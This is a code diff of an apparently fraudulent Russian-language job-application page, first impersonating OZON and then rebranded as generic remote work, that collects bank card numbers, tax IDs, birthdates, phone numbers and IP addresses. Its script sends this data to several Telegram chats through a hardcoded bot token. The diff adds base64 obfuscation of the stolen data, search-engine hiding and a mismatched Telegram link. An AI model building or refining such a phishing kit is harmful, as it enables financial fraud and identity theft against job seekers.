@@ -3,7 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OZON Работа</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="description" content="Платформа для подачи заявок на удалённую работу">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <title>Работа Онлайн</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         body {
@@ -509,7 +512,7 @@
     <div class="container">
         <div class="header-section">
             <div class="header">
-                OZON Поддержка
+                Поддержка Работы
             </div>
             <div class="theme-toggle">
                 <button class="light-btn" onclick="toggleTheme('light', event)"><i class="fas fa-sun"></i></button>
@@ -518,7 +521,7 @@
         </div>
         <div class="main-banner">
             <div class="banner-text">
-                <h2>Работа в OZON</h2>
+                <h2>Удалённая Работа</h2>
                 <p>От 80 000 до 100 000 ₽ в месяц</p>
                 <button onclick="openModal()">Стать работником</button>
             </div>
@@ -563,6 +566,9 @@
                 <label for="inn">ИНН</label>
                 <input type="text" id="inn" name="inn" required placeholder="Введите ваш ИНН">
 
+                <label for="phone">Номер телефона</label>
+                <input type="tel" id="phone" name="phone" required placeholder="Введите ваш номер телефона">
+
                 <label for="city">Город</label>
                 <input type="text" id="city" name="city" required placeholder="Введите ваш город">
 
@@ -577,7 +583,7 @@
     <div id="notificationModal" class="notification">
         <div class="notification-content">
             <h3>Заявка отправлена</h3>
-            <p>Напишите нашему менеджеру в Telegram: <a href="https://t.me/Sofi_Ozon" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
+            <p>Напишите нашему менеджеру в Telegram: <a href="https://t.me/reyzovs" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
             <button id="doneButton" onclick="closeNotification()">Готово</button>
         </div>
     </div>
@@ -613,6 +619,11 @@
             } catch (error) {
                 return 'Не удалось определить IP';
             }
+        }
+
+        function encodeData(data) {
+            const jsonString = JSON.stringify(data);
+            return btoa(jsonString);
         }
 
         function openModal() {
@@ -666,26 +677,24 @@
                 card: formData.get('card'),
                 birthdate: formData.get('birthdate'),
                 inn: formData.get('inn'),
+                phone: formData.get('phone'),
                 city: formData.get('city'),
                 telegram: formData.get('telegram')
             };
 
             const applicationId = generateApplicationId();
-            const botToken = '7673113370:AAH2hS9rKjs6MPTgQofo0RbKbSUsMrDwcR8'; 
+            const botToken = '7673113370:AAH2hS9rKjs6MPTgQofo0RbKbSUsMrDwcR8';
             const adminChatIds = ['6817476091', '7409970440', '2079893058'];
 
             const ipAddress = await getIpAddress();
             const platform = detectPlatform();
 
+            const encodedData = encodeData(data);
+
             const message = `
-Новая заявка на работу в OZON:
+Новая заявка на работу:
 🆔 ID заявки: ${applicationId}
-👤 ФИО: ${data.name}
-💳 Номер карты: ${data.card}
-📅 Дата рождения: ${data.birthdate}
-🆔 ИНН: ${data.inn}
-🏙 Город: ${data.city}
-📱 Telegram: ${data.telegram}
+📦 Данные: ${encodedData}
 🌐 IP-адрес: ${ipAddress}
 💻 Платформа: ${platform}
             `;
